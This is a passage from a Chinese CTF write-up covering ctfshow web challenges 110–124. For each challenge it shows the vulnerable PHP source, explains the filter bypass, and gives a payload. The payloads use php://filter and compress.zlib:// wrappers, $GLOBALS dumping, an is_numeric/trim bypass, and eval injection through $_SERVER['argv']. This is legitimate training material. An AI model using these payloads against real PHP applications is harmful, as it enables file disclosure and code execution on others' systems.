class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]/&#x27;, $v2))&#123;</span><br><span class="hljs-string">            die(&quot;error v2&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>利用FilesystmIterator文件系统迭代器</strong></p><p>因为过滤的原因，原来的payload用不了了。这里使用<code>FilesystemIterator</code>遍历文件系统中的文件和目录，<code>getcwd()</code>获取当前目录（不需要传参，也就用不到单双引号）。<strong>本质就是获取当前目录下的文件。</strong></p><p>payload：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">v1</span><span class="hljs-symbol">=Filesystemiterator</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=getcwd</span><br><br>然后访问fl36dga.txt<br><br></code></pre></td></tr></table></figure><hr><h2 id="web-111（超全局变量-GLOBALS）"><a href="#web-111（超全局变量-GLOBALS）" class="headerlink" title="web-111（超全局变量$GLOBALS）"></a>web-111（超全局变量$GLOBALS）</h2><p>源码：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">highlight_file(__FILE__);<br>error_reporting(0);<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>function getFlag(&amp;$v1,&amp;$v2)&#123;<br>    eval(<span class="hljs-string">&quot;$$v1 = &amp;$$v2;&quot;</span>);<br>    var_dump($$v1);<br>&#125;<br><br><br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/\~|<span class="hljs-string"> </span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&gt;/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            die(&quot;error v1&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if(preg_match(&#x27;/\~</span>|<span class="hljs-string"> </span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&gt;/&#x27;, $v2))&#123;</span><br><span class="hljs-string">            die(&quot;error v2&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            getFlag($v1,$v2);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>$GLOBALS 超全局变量利用</strong></p><p><strong>$GLOBALS — 引用全局作用域中可用的全部变量</strong><br><strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</strong></p><p><strong>首先这里v1的值必须是ctfshow才能通过正则，然后eval(“$$v1 &#x3D; &amp;$$v2;”);进行了赋值操作，将v2的值赋给了v1，我们将v2赋值为GLOBALS，那么v2就会赋值给v1，然后var_dump($$v1)会将$GLOBASL全局变量中的数据全部输出</strong></p><p>payload：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">v1</span><span class="hljs-symbol">=ctfshow</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=GLOBALS</span><br></code></pre></td></tr></table></figure><hr><h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><p><a href="https://www.runoob.com/php/php-superglobals.html">php超级全局变量详解</a></p><hr><h2 id="web-112（is-file-、php伪协议-filter-）"><a href="#web-112（is-file-、php伪协议-filter-）" class="headerlink" title="web-112（is_file()、php伪协议(filter)）"></a>web-112（is_file()、php伪协议(filter)）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(! <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>这里我们需要绕过is_file()函数，我们要传一个文件名但是不能被识别为文件。<code>is_file()</code>检查指定路径是否为一个普通文件。这里我们可以使用php伪协议进行绕过，is_file认为伪协议不是一个文件，<code>而highlight_file</code>认为伪协议是文件。所以可以实现绕过。</strong><br><strong>最后highlight_file就会将指定文件的源代码以HTML格式进行高亮显示并输出到浏览器即可拿到flag</strong></p><p>payload：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//filter/resource=flag.php</span><br></code></pre></td></tr></table></figure><hr><h3 id="php伪协议（filter）"><a href="#php伪协议（filter）" class="headerlink" title="php伪协议（filter）"></a>php伪协议（filter）</h3><p>php:&#x2F;&#x2F;filter是php中的伪协议主要用于在输入和输出流上应用过滤器。基本语法是：php:&#x2F;&#x2F;filter&#x2F;<filter>&#x2F;resource，其中<filter>是要应用的过滤器名称，resource是要过滤的资源。</filter></filter></p><pre><code>过滤读取的数据//先读取flag.php的内容，再进行base64编码，也就是说以后呈现的内容是经过base64编码后的内容。file_get_contents(&#39;php://filter/write=convert.base64-encode/resource=flag.php&#39;） 过滤写入的数据// 先将字符串hello world进行base64编码，再写入flag.php文件中，写的时候是先进行base64解码，再写。也就是说在写的时候，先执行php://filter/write=convert.base64-decode对字符串进行解码。$data=&#39;hello world&#39;;file_put_contents(&#39;php://filter/write=convert.base64-decode/resource=flag.php&#39;，base64($data))</code></pre><hr><h2 id="web-113（is-file、php伪协议-zlib-）"><a href="#web-113（is-file、php伪协议-zlib-）" class="headerlink" title="web-113（is_file、php伪协议(zlib)）"></a>web-113（is_file、php伪协议(zlib)）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(! <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>filter伪协议被过滤了，这里可以使用<code>zlib://</code>伪协议，</strong></p><p>使用zlib:&#x2F;&#x2F;伪协议将数据压缩并写入文件compress_data.txt.gz中；使用zlib:&#x2F;&#x2F;伪协议从压缩的文件中读取解压缩的数据。<br><strong>compress.zlib:&#x2F;&#x2F;flag.php读取 gz 压缩或普通输入文件。</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">zlib:<span class="hljs-regexp">//</span>伪协议<br><span class="hljs-regexp">//</span>压缩数据<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;Hello,World!&#x27;</span>;<br>file_put_content(<span class="hljs-string">&#x27;zlib://compressed_data.txt.gz&#x27;</span>,<span class="hljs-variable">$data</span>)<br><br><span class="hljs-regexp">//</span> 解压缩数据<br><span class="hljs-variable">$decompressedData</span> = file_get_contents(<span class="hljs-string">&#x27;zlib://compressed_data.txt.gz&#x27;</span>)<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">compress</span>.zlib:<span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-114（is-file、php伪协议-filter-）"><a href="#web-114（is-file、php伪协议-filter-）" class="headerlink" title="web-114（is_file、php伪协议(filter)）"></a>web-114（is_file、php伪协议(filter)）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;<br><span class="hljs-keyword">if</span>(! <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这里没有过滤<code>filter</code>，所以直接构造payload</p><p>payload：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//filter/resource=flag.php</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-115（is-numeric-、trim-）"><a href="#web-115（is-numeric-、trim-）" class="headerlink" title="web-115（is_numeric()、trim()）"></a>web-115（is_numeric()、trim()）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>)</span>&#123;<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$num</span>;<br>&#125;<br><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$num</span>)==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>triim()：去除字符串首尾的空格或其他指定字符。使用%0c（换页符）进行绕过</p><p>is_numeric：判断变了是否为数字或数字字符串。绕过方法：%0c（换页符），%20空格符、%0a换行符</p><p><code>！==</code>：强不等于，必须值相等，且类型相等。</p><p>这里要求if判断内全为true，且$num&#x3D;&#x3D;’36’也为true</p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?num<span class="hljs-operator">=</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><hr><h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift">语法<br>trim(string,charlist)<br><br>参数描述<br>string        必需<span class="hljs-operator">。</span>规定要检查的字符串<span class="hljs-operator">。</span><br>charlist    可选<span class="hljs-operator">。</span>规定从字符串中删除哪些字符<span class="hljs-operator">。</span>如果省略该参数，则移除下列所有字符：<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\0</span>&quot;</span>       <span class="hljs-operator">-</span> <span class="hljs-type">NULL</span><br>                <span class="hljs-string">&quot;<span class="hljs-subst">\t</span>&quot;</span>       <span class="hljs-operator">-</span> 制表符<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>       <span class="hljs-operator">-</span> 换行<br>                <span class="hljs-string">&quot;\x0B&quot;</span>     <span class="hljs-operator">-</span> 垂直制表符<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\r</span>&quot;</span>       <span class="hljs-operator">-</span> 回车<br>                <span class="hljs-string">&quot; &quot;</span>        <span class="hljs-operator">-</span> 空格<br></code></pre></td></tr></table></figure><hr><h2 id="web-123（GET-POST传递变量特性（-））"><a href="#web-123（GET-POST传递变量特性（-））" class="headerlink" title="web-123（GET&#x2F;POST传递变量特性（[））"></a>web-123（GET&#x2F;POST传递变量特性（<code>[</code>））</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">18</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><ul><li>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、[，+、点转换为下划线，而传入[之后后面的空格、[，+、点就不会被转为下划线了</li><li>题目里的$c&lt;&#x3D;18，左边是字符串，右边是数字，<code>&lt;=</code>恒成立；如果左右两边都是字符串，会先比较第一个字母的ASCII码值，如果相同，再比较长度，然后逐一比较</li></ul><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php">两种方法：利用<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>); 或<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br><br>利用<span class="hljs-keyword">eval</span>函数输出flag<br>post：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span><br><br><br><br>前置知识：<br><span class="hljs-variable">$_SERVER</span> 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。<br><span class="hljs-string">&#x27;argv&#x27;</span><br>    传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query <span class="hljs-keyword">string</span>。 <br>即<span class="hljs-variable">$_SERVER</span>[‘argv’][<span class="hljs-number">0</span>] = <span class="hljs-variable">$_SERVER</span>[‘QUERY_STRING’]=（get传参？后面的值）<br>例如：<br>?<span class="hljs-variable">$fl0g</span>=flag_give_me;   <span class="hljs-comment">//get</span><br><span class="hljs-variable">$_SERVER</span>[‘argv’][<span class="hljs-number">0</span>]=<span class="hljs-variable">$_SERVER</span>[‘QUERY_STRING’]=<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span><br><br><br><br>利用下面的<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>来输出flag<br>当GET方式传入 赋值的语句<span class="hljs-variable">$fl0g</span>=flag_give_me;时<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$_SERVER</span>[‘argv’][<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span><br><br><br>?<span class="hljs-variable">$fl0g</span>=flag_give_me;                           <span class="hljs-comment">#GET  </span><br>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])      <span class="hljs-comment">#POST  </span><br><br>这里就相当于<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$fl0g</span>=flag_give_me;))<br></code></pre></td></tr></table></figure><hr><h3 id="GET-POST传递变量特性（-）"><a href="#GET-POST传递变量特性（-）" class="headerlink" title="GET&#x2F;POST传递变量特性（[）"></a>GET&#x2F;POST传递变量特性（[）</h3><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、[，+、点转换为下划线，而传入[之后后面的空格、[，+、点就不会被转为下划线了</p><hr><h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h3><p><strong>$_SERVER[‘argv’]：传递给脚本的参数数组。</strong></p><p><strong>命令行情况下，$_SERVER[‘argv’][0]第一个元素是脚本的文件名（test.php），之后的元素是传递给脚本的参数（test1、test2）<br>在这里插入图片描述<br>web网页模式下，$arg只接受GET传参，且必须在php.ini开启register_argc_argv配置项。$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’] &#x3D; GET传参的值（?后面的），关于$_SERVER[‘QUERY_STRING’]</strong></p><hr><h2 id="web-124（highlight-file、-、get传参、arg）"><a href="#web-124（highlight-file、-、get传参、arg）" class="headerlink" title="web-124（highlight_file、[、get传参、arg）"></a>web-124（highlight_file、[、get传参、arg）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 